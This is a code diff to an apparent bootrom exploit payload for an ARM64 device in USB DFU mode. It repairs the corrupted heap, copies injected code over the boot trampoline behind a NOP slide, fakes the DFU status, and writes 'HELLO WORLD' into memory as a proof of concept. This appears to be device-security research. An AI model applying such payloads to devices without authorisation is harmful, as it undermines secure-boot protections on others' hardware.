@@ -1,6 +1,8 @@
 #include "dev/addr.h"
 #include "dev/types.h"
+
 #include "bootrom_func.h"
+#include "dev_cache.h"
 
 extern unsigned long long get_hook();
 
@@ -14,12 +16,6 @@ PAYLOAD_SECTION
 unsigned long long get_boot_entry()
 {
     return ADDR_GETBOOT_ENTRY;
-}
-
-PAYLOAD_SECTION
-void patch()
-{
-    //TODO
 }
 
 PAYLOAD_SECTION
@@ -66,8 +62,8 @@ void fix_heap()
         {
             curr->curr_size--;
             calc_chksum(&curr->chksum,
-                    (unsigned char *) curr + 0x20,
-                    0x30, (void *) ADDR_HEAP_COOKIE);
+                        (unsigned char *) curr + 0x20,
+                        0x30, (void *) ADDR_HEAP_COOKIE);
 
             (curr + curr->curr_size)->prev_free = curr->curr_free;
             (curr + curr->curr_size)->prev_size = curr->curr_size;
@@ -87,9 +83,68 @@ void fix_heap()
 }
 
 PAYLOAD_SECTION
-void entry_sync(uint64_t addr_hook)
+void trampoline_function()
 {
-    uint64_t *bootstrap_sp = ((uint64_t *) ADDR_BOOTSTRAP_TASK + 0x25);
+    int8_t *base = (int8_t *) 0x18010a36f;
+    uint64_t addr, arg;
+
+    __asm__ volatile ("str x0, %0" : "=m" (addr));
+    __asm__ volatile ("str x1, %0" : "=m" (arg));
+
+    base[9] = ' ';
+    base[10] = 'H';
+    base[11] = 'E';
+    base[12] = 'L';
+    base[13] = 'L';
+    base[14] = 'O';
+    base[15] = ' ';
+    base[16] = 'W';
+    base[17] = 'O';
+    base[18] = 'R';
+    base[19] = 'L';
+    base[20] = 'D';
+    base[21] = ' ';
+
+    __asm__ volatile ("ldr x0, %0"::"m" (addr));
+    __asm__ volatile ("ldr x1, %0"::"m" (arg));
+}
+
+PAYLOAD_SECTION
+void patch_trampoline()
+{
+    int i;
+    const uint32_t arm64_ret = 0xd65f03c0, arm64_nop = 0xd503201f, align = 0x40;
+
+    uint32_t *p_start, *p_end, p_len, t_offset;
+    uint32_t *t_src = (uint32_t *) ADDR_TRAMPOLINE, *t_dst;
+
+    // get bounds of the patch
+    __asm__ volatile ("adr %0, %1" : "=r" (p_start) : "X" (&trampoline_function));
+
+    p_end = p_start;
+    while(*p_end != arm64_ret) p_end++;
+
+    p_len = p_end - p_start;
+    t_offset = ((p_len / align) + 1) * align;
+
+    // copy the trampoline to new location
+    t_dst = t_src + t_offset;
+    for(i = LEN_TRAMPOLINE - 1; i >= 0; i--)
+        t_dst[i] = t_src[i];
+
+    // copy patch to beginning
+    for(i = 0; i < p_len; i++)
+        t_src[i] = p_start[i];
+
+    // nop slide between patch and trampoline
+    for(i = p_len; i < t_offset; i++)
+        t_src[i] = arm64_nop;
+}
+
+PAYLOAD_SECTION
+void entry_sync()
+{
+    uint64_t *bootstrap_sp = (uint64_t *) ADDR_BOOTSTRAP_TASK + 0x25;
     uint64_t *bootstrap_stack = (uint64_t *) *bootstrap_sp;
 
     while(1)
@@ -103,12 +158,14 @@ void entry_sync(uint64_t addr_hook)
         bootstrap_stack++;
     }
 
+    fix_heap();
+    patch_trampoline();
+
     *(ADDR_DFU_RETVAL) = -1;
     *(ADDR_DFU_STATUS) = 1;
-
-    fix_heap();
     event_notify(ADDR_DFU_EVENT);
 }
 
 PAYLOAD_SECTION
-void entry_async(){}
+void entry_async()
+{}
